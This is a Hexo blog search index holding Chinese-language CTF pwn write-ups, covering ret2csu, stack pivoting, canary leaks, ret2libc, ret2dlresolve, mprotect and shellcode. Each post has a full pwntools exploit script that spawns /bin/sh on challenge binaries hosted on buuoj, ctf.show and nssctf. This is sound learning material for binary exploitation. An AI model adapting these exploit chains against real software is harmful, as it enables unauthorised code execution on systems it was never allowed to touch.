{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"标签","date":"2025-07-21T01:52:05.551Z","updated":"2025-07-21T01:52:05.551Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2025-07-21T01:51:03.000Z","updated":"2025-07-21T01:51:03.362Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"libc版本切换","slug":"libc环境切换","date":"2025-08-02T10:43:25.000Z","updated":"2025-08-02T13:14:05.498Z","comments":true,"path":"2025/08/02/libc环境切换/","permalink":"http://example.com/2025/08/02/libc%E7%8E%AF%E5%A2%83%E5%88%87%E6%8D%A2/","excerpt":"","text":"更换libc版本首先要拿到对应的libc.so文件 然后查看版本 1strings libc文件名 |grep ubuntu 然后切换clibc版本 1libc 文件名 libc版本信息 查看libc版本通过got表泄露libc版本 输出一个外置函数的got表地址 然后在网站匹配之后下载","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"ciscn_2019_s_3","slug":"ciscn-2019-s-3","date":"2025-08-02T07:50:19.000Z","updated":"2025-08-02T10:38:28.445Z","comments":true,"path":"2025/08/02/ciscn-2019-s-3/","permalink":"http://example.com/2025/08/02/ciscn-2019-s-3/","excerpt":"","text":"没有后门函数，也没有能用来泄露libc地址的东西 但是看到有execve和一些对寄存器的操作，考虑csu 在栈上写入&#x2F;bin&#x2F;sh,之后调用它 数据在栈的位置不是固定的，但是偏移是固定的 可以通过read和write来泄露栈上的地址 泄露地址 注意要更换为和题目一样的环境，否则偏移计算错误 buf的起始位置是0x7fffffffdd70 栈上的那个位置是0x7fffffffdd90对应的数据，我们gdb调试之后发现是这个位置是栈上的位置 所以选择读取这个位置的地址 且 这个函数返回时直接ret，没有进行pop ebp的操作，所以在构造payload的时候不需要覆盖ebp 脚本 123456payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh)) 调用64位时，rax&#x3D;59（#define__NR_execve 59）;rdi&#x3D;”&#x2F;bin&#x2F;sh”;rsi&#x3D;0;rdx&#x3D;0; rax&#x3D;59地址已经找到了 ROPgadgets命令查看，发现只有对rdi和rsi的操作 剩下的就是基本的scu了 123456rbx_rbp_r12_r13_r14_r15#r13&gt;rdx r14&gt;rsi r15&gt;edi#call r12+rbx*8#add rbx, 1#cmp rbx, rbp 设置好rdx、rsi、rdi，然后调用 syscall 首先r14和r13一定要赋值为0，而且r15d的值 函数会跳转到r12+rbx*8,让它调用syscall，rbx赋值0 且只调用一次 所以rbp&#x3D;1 最终执行 12mov rax, 59 ; syscall number for execvesyscall 脚本 123456payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive() 注意 ✅ mov edi, r15d和 rdi 的关系 1mov edi, r15d 只看语法，是： 把 r15d的值（32 位）赋给 edi（也是 32 位） 但这里有个关键点： 在 x86-64 架构中，对 rdi 的低 32 位写入（edi）时，高 32 位会被清零！ 🔍 举个例子 12mov rdi, 0x4141414141414141mov edi, 0x42424242 执行完第二条指令后，rdi的值是： 1rdi == 0x0000000042424242 也就是说： 写 edi 相当于先清空 rdi，再写低 32 位 mov edi, r15d其实等价于： 1rdi = r15 &amp; 0xffffffff 所以你能用它来设置 rdi 的值前提是你设置的 r15 是一个 32 位以内的地址（或者值），比如 &#x2F;bin&#x2F;sh 的地址必须低于 0x100000000，否则会丢高位，导致 execve 崩溃或 syscall 参数错误 所以要之后再放设置rdi的值 脚本1234567891011121314151617181920212223242526272829303132from pwn import *#p=process(&quot;./ciscn_s_3&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28493)syscall=0x400517vuln=0x4004EDrdi=0x4005a3rax=0x4004E2pop6=0x40059A#rbx_rbp_r12_r13_r14_r15mov=0x400580#r13&gt;rdx r14&gt;rsi r15&gt;edi #call r12+rbx*8 #add rbx, 1 #cmp rbx, rbp payload=b&quot;a&quot;*16+p64(vuln)p.sendline(payload)p.recv(32)place=u64(p.recv(8))bin_sh=place-0x118print(hex(bin_sh))payload = b&#x27;/bin/sh\\x00&#x27; + b&#x27;b&#x27;*8 + p64(pop6)payload += p64(0)*2 + p64(bin_sh + 0x50) + p64(0)*3payload += p64(mov) + p64(rax)payload += p64(rdi) + p64(bin_sh) + p64(syscall)p.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"栈迁移","slug":"栈迁移","date":"2025-08-01T07:14:49.000Z","updated":"2025-08-02T07:56:40.772Z","comments":true,"path":"2025/08/01/栈迁移/","permalink":"http://example.com/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/","excerpt":"","text":"两个对buf的输入pwn75 位置不够，且有system函数 差是0x38 脚本 123456789101112131415161718192021222324252627from pwn import *context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#p = process(&#x27;./pwn75&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)p.recvuntil(b&quot;codename:&quot;)payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp))leave=0x080486ACsystem=0x08048400main=0x08048768off=0x38buf=ebp-offp.recvuntil(b&quot;want to do?&quot;)payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot;payload=payload.ljust(0x28,b&quot;a&quot;)payload+=p32(buf-4)+p32(leave)p.sendline(payload)p.interactive() 1payload=p32(system)+p32(main)+p32(buf+12)+b&quot;/bin/sh\\x00&quot; 把&#x2F;bin&#x2F;sh字符段通过payload放入栈上，之后再system函数的的参数位置放置&#x2F;bin&#x2F;sh字符串的位置 12345payload=b&quot;a&quot;*0x24+b&quot;1234&quot;p.send(payload)p.recvuntil(b&quot;1234&quot;)ebp = u32(p.recv(4))print(hex(ebp)) 注意sendline会在发送payload之后再发送一个&#x2F;n 会影响接收数据","categories":[],"tags":[{"name":"栈迁移","slug":"栈迁移","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"}]},{"title":"[2021 鹤城杯]littleof","slug":"2021-鹤城杯-littleof","date":"2025-07-31T07:43:25.000Z","updated":"2025-07-31T11:16:29.603Z","comments":true,"path":"2025/07/31/2021-鹤城杯-littleof/","permalink":"http://example.com/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/","excerpt":"","text":"开启了canary保护 所以用printf泄露canary的数值 之后用ret2libc的方法解决 脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./littleof&#x27;)p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28230)elf = ELF(&quot;./littleof&quot;)# canarypayload1 = b&#x27;a&#x27; * (0x50 - 0x8) + b&#x27;b&#x27;p.recvuntil(b&#x27;Do you know how to do buffer overflow?\\n&#x27;)p.send(payload1)p.recvuntil(b&#x27;b&#x27;)canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;))print(f&quot;canary :&#123;hex(canary)&#125;&quot;)# ret2libcrdi = 0x400863ret = 0x40059eputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = 0x400789payload2 = b&#x27;a&#x27; *0x48 + p64(canary)payload2+= p64(0) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p.sendline(payload2)p.recvuntil(b&#x27;I hope you win\\n&#x27;)puts_addr = u64(p.recvuntil(b&#x27;\\n&#x27;)[:-1].ljust(8, b&#x27;\\00&#x27;))print(f&quot;puts_addr: &#123;hex(puts_addr)&#125;&quot;)libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)system_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)#gdb.attach(p,&quot;b *0x0000000000400787&quot;)payload3 = b&#x27;a&#x27; * (0x50 - 0x8) + p64(canary) + p64(0)payload3+=p64(ret)+ p64(rdi) + p64(bin_sh) + p64(system_addr)p.sendline(payload3)p.interactive() 1canary = u64(p.recv(7).rjust(8, b&#x27;\\00&#x27;)) 此时读取的还是小端序。所以在左侧补位\\x00 收获小端序12leaked = p.recv(8) # 收到 8 字节：b&#x27;\\x00\\x12\\x34\\x56\\x78\\x9a\\xbc\\xde&#x27;value = u64(leaked) # → 0xdebc9a7856341200 12target_addr = 0x401123p.send(p64(target_addr)) # → 发送 b&#x27;\\x23\\x11\\x40\\x00\\x00\\x00\\x00\\x00&#x27; 从内存读整数（canary、地址） ✅ 是 用u32&#x2F;u64 向内存写整数（ROP、溢出） ✅ 是 用p32&#x2F;p64 字符串（”hello”） ❌ 否 按正常顺序 网络协议 ❌ 否（用大端） 用&gt;I,&gt;Q 文件格式（ELF、PNG） ❌ 否 按字节流顺序 格式化字符串输出（%p） ❌ 否 直接转整数 泄露的 hex 字符串（如 “aabbccdd”） ❌ 否 先bytes.fromhex()再看是否要反转","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"小端序","slug":"小端序","permalink":"http://example.com/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/"},{"name":"Canary","slug":"Canary","permalink":"http://example.com/tags/Canary/"}]},{"title":"__libc_csu_init","slug":"libc-csu-init","date":"2025-07-30T07:49:03.000Z","updated":"2025-07-31T06:15:35.778Z","comments":true,"path":"2025/07/30/libc-csu-init/","permalink":"http://example.com/2025/07/30/libc-csu-init/","excerpt":"","text":".dynstr (Dynamic String Table，动态字符串表) 作用： 存储了程序在运行时需要动态链接的所有符号（函数和变量）的名称字符串。这些字符串是 ASCII 格式的，以空字符 (\\x00) 结尾。 内容： 例如，像 “read”, “write”, “system” 这样的函数名，以及外部变量的名称，都存储在这个段中。 在动态链接中的角色： 当动态链接器需要查找一个符号（比如 system 函数）时，它会先在符号表 (.dynsym) 中找到该符号的条目，然后根据该条目中记录的偏移量到 .dynstr 中找到对应的函数名字符串。 .dynsym (Dynamic Symbol Table，动态符号表) 作用： 存储了程序中所有动态链接符号的详细信息。每个条目对应一个外部函数或变量。 内容： 每个条目是一个 Elf32_Sym (32位) 或 Elf64_Sym (64位) 结构体，其中包含： st_name：符号名称在 .dynstr 中的偏移量。 st_value：符号的值（例如，如果符号是函数，则通常是其地址；如果是变量，则是其地址）。 st_size：符号的大小。 st_info：符号的类型（函数、数据等）和绑定属性（全局、局部等）。 st_shndx：符号所属的段索引。 在动态链接中的角色： 动态链接器通过重定位条目 (.rel.plt) 中的索引，在 .dynsym 中找到对应的符号信息。然后，它会根据 st_name 字段去 .dynstr 查找符号的名称，并最终解析出该符号在内存中的实际地址。 .rel.plt (Relocation Table for Procedure Linkage Table，PLT 重定位表) 作用： 存储了所有与 PLT (Procedure Linkage Table) 相关的重定位条目。这些条目告诉动态链接器在程序加载或运行时需要修改哪些地址，以便函数能够正确地被调用。 内容： 每个条目是一个 Elf32_Rel (32位) 或 Elf64_Rela (64位) 结构体，其中包含： r_offset：需要被重定位的内存地址。对于 PLT，这通常是 GOT (Global Offset Table) 中对应函数的条目地址。 r_info：包含了符号表 (.dynsym) 中的索引和重定位类型（例如 R_386_JUMP_SLOT，表示这是一个用于函数跳转的重定位）。 在动态链接中的角色： 当一个外部函数第一次通过 PLT 被调用时，PLT stub 会将 relocation_index 压栈，并跳转到 plt0，最终调用 _dl_runtime_resolve。_dl_runtime_resolve 会使用这个 relocation_index 来查找 .rel.plt 中的对应条目，从而获取到需要解析的符号（通过 r_info 中的符号索引指向 .dynsym）以及该符号解析后地址应该写入的 GOT 条目 (r_offset)。 总结关系： .rel.plt 中的重定位条目指向 .dynsym 中的符号条目。 .dynsym 中的符号条目又通过偏移量指向 .dynstr 中的符号名称字符串。 动态链接器 (_dl_runtime_resolve) 就是通过这一系列的链式查找，最终找到外部函数的真实地址，并将其写入到 GOT 表中，从而实现函数的动态链接。 在 ret2_dl_runtime_resolve 攻击中，我们正是通过伪造这些结构体，来欺骗动态链接器，使其解析并跳转到我们指定的任意函数（如 system）。 逐步进行 1.plt0调用write完成ROP链并调用write（1,”&#x2F;bin&#x2F;sh\\x00”,8）函数。 ❑使用plt0作为调用的入口，并且传入write的index参数，这里同时伪造index参数，在bss段上伪造对应的reloc结构体，从而达到目的。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *import osos.environ[&#x27;TERM&#x27;] = &#x27;xterm&#x27;p = process(&quot;./ret2_dl_runtime_resolve&quot;)elf = ELF(&quot;./ret2_dl_runtime_resolve&quot;)ebp = 0x080485eb leave_ret = 0x08048557 pop3 = 0x080485e9 # pop esi; pop edi; pop ebp; ret）bss_addr = 0x0804A900 # BSS段起始地址rop_addr = bss_addr cmd = b&quot;/bin/sh\\x00&quot; cmd_addr = bss_addr + 0x200 plt0 = 0x08048380 # PLT0地址（_dl_runtime_resolve入口）write_index = 0x10 # write函数在.rel.plt中的索引p.recvuntil(b&quot;ret2_dl_runtime_resolve\\n&quot;)payload1 = b&quot;a&quot; * 0x108 + b&quot;junk&quot; payload1 += p32(elf.plt[&quot;read&quot;])+p32(pop3)+p32(0)+p32(bss_addr)+p32(0x500) payload1 += p32(ebp)+p32(rop_addr - 4)+p32(leave_ret) payload1 = payload1.ljust(0x200, b&quot;\\x00&quot;)p.send(payload1)rop_data = p32(plt0) # 调用_dl_runtime_resolverop_data += p32(write_index) # write函数的重定位索引rop_data +=p32(pop3) + p32(1) + p32(cmd_addr) + p32(8) rop_data = rop_data.ljust(0x200, b&quot;\\x00&quot;)rop_data += cmdrop_data = rop_data.ljust(0x500, b&quot;\\x00&quot;)p.send(rop_data)p.interactive() 模拟动态链接器的延迟绑定过程： p32(plt0)： 跳转到_dl_runtime_resolve p32(write_index)：传递重定位参数（相当于push 0x10） write函数的关键参数 GOT地址：0x0804a014 (write@got.plt) 原始r_info：0x407 (符号索引&#x3D;4，类型&#x3D;7) 重定位索引：write是第3项（从0开始），所以write_index &#x3D; 2 * 8 &#x3D; 0x10 2.伪造index参数如何计算 fake_write_index 动态链接器通过以下公式定位条目： 1Elf32_Rel *reloc = .rel.plt + reloc_arg; 因此： 1fake_write_index = fake_reloc_addr - rel_plt 所以fake_write_index &#x3D; fake_reloc_addr - 0x0804833C","categories":[],"tags":[]},{"title":"ez_pz_hackover_2016","slug":"ez-pz-hackover-2016","date":"2025-07-29T02:28:09.000Z","updated":"2025-08-02T10:42:26.916Z","comments":true,"path":"2025/07/29/ez-pz-hackover-2016/","permalink":"http://example.com/2025/07/29/ez-pz-hackover-2016/","excerpt":"","text":"首先程序会输出s的地址，要按照字符串去接收，算是10个字节 接着输入s 对s有一个校验，result &#x3D; strcmp(s, “crashme”); 会挨个字符查看，直到到遇到&#x2F;x0,所以我们可以通过在字符串中传入&#x2F;x0来绕过 接着执行vuln函数 这个函数会把值赋给dest，这个dest可以通过栈溢出控制返回地址 没开nx保护，考虑shellcode 所以这道题目通过在s的传入时，写入shellcode ,同时控制好返回地址，让s赋值给dest时返回地址对应 看到对dest传入的参数b’crashme\\x00’，他从0xffbbf812开始，ebp是 0xffbbf828，相距0x16 所以实际dest的栈空间是0x16 ebp的搞一个地址是ret,之后我们可以对其填充shellcode 所以s和shellcode的距离是0x24-0x8&#x3D;0x1c 所以 脚本1234567891011121314151617from pwn import *context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, bits=32)p=remote(&quot;node5.buuoj.cn&quot;,26268)#p=process(&#x27;./ez_pz_hackover_2016&#x27;)#gdb.attach(p,&#x27;b *0x08048600&#x27;)p.recvuntil(&#x27;crash: &#x27;)stack=int(p.recv(10),16)print(hex(stack))shellcode=asm(shellcraft.sh())#payload=b&#x27;crashme\\x00&#x27;payload=b&#x27;crashme\\x00&#x27;+b&#x27;a&#x27;*(0x16-8+4)+p32(stack-0x1c)+shellcodep.sendline(payload)‘p.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"}]},{"title":"","slug":"gyctf-2020-borrowstack","date":"2025-07-27T07:32:04.600Z","updated":"2025-07-27T10:27:43.562Z","comments":true,"path":"2025/07/27/gyctf-2020-borrowstack/","permalink":"http://example.com/2025/07/27/gyctf-2020-borrowstack/","excerpt":"","text":"title: pwn49date: 2025-07-26 16:00:42tags: [ctfshow, PWN, mprotect] 思路： 让在bank上构造rop链，通过buf跳转过去，泄露libc找到one_gadget 脚本12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *#p=process(&quot;./gyctf_2020_borrowstack&quot;)p=remote(&quot;node5.buuoj.cn&quot;,27049)elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)bank=0x0000000000601080leave=0x400699rdi=0x0400703ret=0x4004c9puts_plt=elf.plt[&quot;puts&quot;]puts_got=elf.got[&quot;puts&quot;]main=0x400626payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)p.recvuntil(b&quot;want&quot;)p.send(payload1)p.recvuntil(b&quot;now!&quot;)payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.send(payload2)a=p.recvline()puts= u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(puts))libc=LibcSearcher(&quot;puts&quot;,puts)libc_base=puts-libc.dump(&quot;puts&quot;)one=libc_base+0x4526apayload=b&#x27;a&#x27;*0x68+p64(one)p.sendline(payload)p.interactive() 收获函数跳转第一段 payload 是发生在 第一次 read()，它虽然劫持了 rbp 和返回地址，但程序还在 vuln() 函数里。 也就是说：你执行完 read() 后，还没 leave、还没 ret！ 然后继续执行 puts(&quot;now!&quot;) 和第二个 read()。 第二个 read() 这时候读取的目标还是 buf，但是 rsp 已经变成 .bss（你通过 rbp=bank, 之后再执行 leave 实现的）。 🔁 怎么理解栈迁移后还能 read？ 你第一次发送： 1payload = b&#x27;a&#x27;*0x60 + p64(bank) + p64(leave) 但这段 payload 不是立即执行的！ 它只是被 read 读取到了栈上的 buf 中，覆盖了原来的返回地址（ret）和 rbp 而已。 read() 函数结束 → 函数栈继续执行 → 执行 puts(&quot;now!&quot;) 执行第二个 read()，程序才停下来等待输入 直到 vuln() 函数 return，leave 和 ret 才会被执行！ 🧠 实际流程如下： 第一次 read 读取你的第一个 payload： 覆盖了 rbp = bank 覆盖了 ret = leave 但程序并没有立刻跳转，它只是把 payload 写入 buf，继续执行 vuln 函数： puts(&quot;now!&quot;) 第二个 read() 等待你输入（此时 rsp = buf, 但即将栈迁移） 函数执行到结尾，开始执行 leave; ret 把 rsp = bank，开始执行你布置在 .bss 上的第二段 ROP 链！ ✅ 所以，第一次 payload 并不让程序跳转，只是布置好了栈迁移准备 第二次 read() 是程序自己继续执行逻辑中调用的。 p64(ret)*0x20原因当 main 函数再次被执行时（因为你的 ROP 链最后跳转到了 main 函数的地址）： 程序会为新的 main 函数调用重新分配一个栈帧。 在这个新的栈帧中，会再次为局部变量 buf[96] 分配空间。 为什么“临时变量的空间会覆盖到 GOT 表”？ 这里就是关键点。在 64 位程序中，栈是向下增长的（从高地址向低地址）。 GOT 表通常在程序的低地址区域。 （例如：0x0601018） bank 变量在 .bss 段，通常地址比 GOT 表高。 （例如：0x0601080） 栈会向下增长。 当 main 函数再次被调用，并且它在堆栈上分配 buf 等局部变量时，这些变量会占用 rsp 向下增长的内存空间。 现在想象一下： 你的栈迁移，把 rsp 设置到了 bank 处（例如 0x0601080）。 你用 p64(ret)*20 把你的 ROP 链推到了 bank + 160 (例如 0x0601120)。 你的 ROP 链执行，泄漏 puts 地址。 然后，你的 ROP 链最后执行 p64(main)，导致程序跳转回 main 函数的开头。 当 main 函数再次执行时，它会在栈上重新分配空间。 此时，新的栈帧可能会从 rsp 的当前位置（即 0x0601120，也就是你的 ROP 链最后执行完的位置）开始向下（向低地址）增长。 如果 main 函数分配的局部变量（例如 buf[96]）的新空间，在栈向下增长的过程中，恰好“覆盖”到了 GOT 表所在的内存区域（例如 0x0601018），那么 GOT 表的地址就会被这些局部变量的垃圾数据所破坏。 p64(ret)*20 的作用 所以，p64(ret)*20 在这里的另一个重要作用就是： 它将你的伪造栈帧（即你写入 bank 的 ROP 链）向高地址方向推得更远。 这样，当 main 函数再次被调用时，它会从你伪造栈的末尾（bank + 160 + ROP 链长度）开始向下分配新的栈帧。 通过把你的伪造栈（和 rsp 的位置）设置在足够高的地址，可以确保 main 函数再次分配的局部变量空间（栈向下增长的部分）不会侵犯到位于低地址的 GOT 表。 用图示来说明： 没有 p64(ret)\\*20 的风险： 1234567891011121314高地址...0x0601080 &lt;-- bank (rsp 迁移到这里)| pop_rdi || puts_got| &lt;-- ROP链| puts_plt|| main |...0x0601018 &lt;-- puts_got (GOT表)...低地址当 main 再次运行，它可能从 0x0601080 附近向下分配新的 buf 空间，这个 buf 空间可能直接覆盖到 0x0601018 处的 puts_got。 有了 p64(ret)\\*20 的好处： 1234567891011121314151617181920高地址...0x0601120 &lt;-- bank + 160 (rsp 最终会到这里)| pop_rdi || puts_got| &lt;-- ROP链| puts_plt|| main |...0x0601080 &lt;-- bank (rsp 最初迁移到这里，p64(ret)*20 填充)| ret || ... || ret |...0x0601018 &lt;-- puts_got (GOT表)...低地址当 main 再次运行，它会从 0x0601120 附近向下分配新的 buf 空间。由于 0x0601120 足够高，向下分配的 buf 空间不会到达 0x0601018 的 puts_got。GOT表因此被保护了。 所以，这段解释指的是：p64(ret)\\*20 能够将你的 ROP 链的“起点”抬高，从而避免当程序再次回到 main 函数并重新分配栈空间时，main 函数的局部变量（如 buf）在栈向下增长时，其空间与 GOT 表发生重叠，进而破坏 GOT 表。 这是一种非常常见的，也是非常重要的防御性策略，确保了后续攻击（例如获取 Shell）的可靠性，因为这些攻击通常需要一个完好无损的 GOT 表来解析函数地址。 大小1.可以从一个小数开始尝试（推荐） 一般情况下20就够了 不能太大， read(0, &amp;bank, 0x100uLL) 写入的。这个 read 函数最多只能读取 0x100 (256) 字节。 你的 payload 长度是有限制的。 p64(ret)*N 占据的字节数是 N * 8。 你的核心 ROP 链 (p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)) 本身也需要空间。 p64(pop_rdi): 8 字节 p64(puts_got): 8 字节 p64(puts_plt): 8 字节 p64(main): 8 字节 核心 ROP 链共 4 * 8 = 32 字节。 如果 N 过大，例如 N=100，那么 p64(ret)*100 就需要 100 * 8 = 800 字节。这已经远远超过了 read 函数能读取的最大 0x100 (256) 字节。 one_gadgetone_gadget 是一个命令行工具，它用于分析 libc 库文件，并找到其中可以直接用于获取 shell 的指令序列的偏移量。 与传统的 system(&quot;/bin/sh&quot;) 方法相比，one_gadget 通常更简洁，因为它只需要一个地址就能获取 shell，而不需要 pop_rdi gadget、&quot;/bin/sh&quot; 字符串的地址和 system 函数的地址。 此外，one_gadget 通常对环境（包括栈对齐）的要求更宽松。 用法和shellcode一样 找到位置即可 把泄露出来的地址在libc匹配网站 之后下载匹配的的libc版本 用命令 1one_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so 找到合适的偏移量即可 所以，LibcSearcher 匹配的版本是它自己数据库中的版本，而不是你本地计算机上 /lib/x86_64-linux-gnu/libc.so.6 这样的文件。 123system=libc_base+libc.dump(&#x27;system&#x27;)binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system) 是用它LibcSearcher匹配的版本，而one_gadget是用我们匹配下载的libc文件去实际计算的，更准确 system(&quot;/bin/sh&quot;) 的失败： system(&quot;/bin/sh&quot;) 方法需要计算 system 函数的地址 (libc_base + libc.dump(&#39;system&#39;)) 和 &quot;/bin/sh&quot; 字符串的地址 (libc_base + libc.dump(&#39;str_bin_sh&#39;))。 如果这种方法失败，最核心的原因是 LibcSearcher 为你选定的那个 libc 版本（例如 libc6_2.23-0ubuntu10_amd64），虽然其 puts 偏移和 one_gadget 的特定偏移与远程服务器相符，但其内部记录的 system 函数和 &quot;/bin/sh&quot; 字符串的相对偏移量，与远程服务器实际 libc 中的这两个偏移量不一致**。 libc 版本号（如 2.23）可能相同，但不同的发行版或编译选项（如 ubuntu10 vs ubuntu11，或不同的构建日期）会导致内部函数和字符串的具体相对位置存在细微差异。即使 puts 和某个 one_gadget 的偏移恰好相同，system 或 &quot;/bin/sh&quot; 的偏移可能就不同了。 当你用错误的偏移量计算出 system 和 &quot;/bin/sh&quot; 的地址并尝试跳转时，程序会因为 RIP 指向无效地址或 system 函数接收到无 效参数而崩溃（dumped core）。","categories":[],"tags":[]},{"title":"pwn49","slug":"pwn49","date":"2025-07-26T08:00:42.000Z","updated":"2025-08-02T10:42:17.921Z","comments":true,"path":"2025/07/26/pwn49/","permalink":"http://example.com/2025/07/26/pwn49/","excerpt":"","text":"看出是静态编译，考虑用mprotect来修改它的权限 ctrl+s查看bss段，找要修改的范围 因为mprotect的地址选择的限制条件 我们把页面边界定为0x80DA000 接着就可以构造payload了 先调用mprotect函数修改权限，再用read函数把后门函数读入这个位置 之后控制返回地址让程序回到这个地方执行后门函数 脚本12345678910111213141516171819from pwn import *#p=process(&quot;./pwn49&quot;)context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)p=remote( &quot;pwn.challenge.ctf.show&quot;,28242)elf=ELF(&quot;./pwn49&quot;)edx_ecx_ebx=0x08056194mprotect=0x0806cdd0start=0x80DA000read=elf.sym[&quot;read&quot;]payload=b&#x27;a&#x27;*(0x12+4)+p32(mprotect)payload += p32(edx_ecx_ebx) + p32(start) + p32(1000) + p32(7)payload+=p32(read)+p32(edx_ecx_ebx)+p32(0)+p32(start)+p32(1000)+p32(start)p.sendline(payload)payload=asm(shellcraft.sh())p.sendline(payload)p.interactive() （找pop_ret时只需要控制是pop了三个寄存器就可以） mprotect mprotect 系统调用有严格的页面对齐要求： 起始地址必须是页面边界（4KB个字节的倍数）（4KB&#x3D;1000字节) 长度会被向上舍入到页面边界 区间长度 len 必须是页大小的整数倍 假设你的 BSS 段开始于 0x80DB320,len长度为1000： 内存布局： 1234567891011121314150x80DA000 ┌─────────────────┐ ← 页面边界（4KB对齐）​ │ 页面1 │​ │ │0x80DB320 ┌─────────────────┐ ← BSS段开始​ │ BSS段 │​ │ │0x80DBFFF └─────────────────┘ ← 页面1结束0x80DC000 ┌─────────────────┐ ← 下一个页面边界","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"mprotect","slug":"mprotect","permalink":"http://example.com/tags/mprotect/"}]},{"title":"pwn44","slug":"pwn44","date":"2025-07-26T06:26:45.000Z","updated":"2025-07-26T07:18:11.765Z","comments":true,"path":"2025/07/26/pwn44/","permalink":"http://example.com/2025/07/26/pwn44/","excerpt":"","text":"有system函数，无字符段，可以通过泄露libc基址 但是也可以通过调用gets函数写入 脚本1234567891011121314151617from pwn import *p=process(&quot;./pwn44&quot;)#gdb.attach(p,&quot;b*0x0000000000400737&quot;)#p=remote(&quot;pwn.challenge.ctf.show&quot;,28121)elf=ELF(&quot;./pwn44&quot;)system=0x00400520rdi=0x4007f3gets_plt=elf.plt[&quot;gets&quot;]bss=0x0602080ret=0X4004fepayload=b&#x27;a&#x27;*(0xa+8)payload+=p64(rdi)+p64(bss)+p64(gets_plt)payload+=p64(rdi)+p64(bss)+p64(system)p.sendline(payload)p.sendline(b&quot;/bin/sh&quot;)p.recv()p.interactive() gets 返回： 当 gets 函数返回时，它会从栈上弹出被覆盖的返回地址（即 p64(rdi) 的值），RIP 跳转到 pop rdi; ret 这个 gadget。此时，rsp 会增加 8 字节，指向 p64(binsh_addr)。 pop rdi; ret Gadget 执行： pop rdi：栈顶的 p64(binsh_addr) 被弹出到 RDI 寄存器。rsp 再次增加 8 字节，指向 p64(system_addr)。 ret：栈顶的 p64(system_addr) 被弹出到 RIP 寄存器。rsp 再次增加 8 字节。 system 函数执行： RIP 跳转到 system 函数的入口地址。 栈对齐： 同样地，当 RIP 跳转到 system 函数的地址时，rsp 也会是 16 字节对齐的，这满足了 system 函数的堆栈对齐要求。 system 函数从 RDI 寄存器中读取 /bin/sh 的地址。 system 函数内部调用 execve(&quot;/bin/sh&quot;, ...)。 关键点： execve 系统调用会替换当前进程的映像。这意味着，一旦 execve 成功，当前的程序（包括其栈帧、ROP 链等）将被 /bin/sh 进程完全取代。system 函数本身不会返回到调用它的位置，因为它已经变身为一个新的 /bin/sh 进程。 因此，system 函数后面的栈内容（如果有的话）都不会再被执行。 gets函数对栈对齐的要求？ gets 函数很简单，它读取用户输入并写入缓冲区，对栈对齐的要求不高。 实际上，gets 很少在 libc 里使用 SIMD 指令，不会因为栈未对齐而崩溃。 所以调用 gets 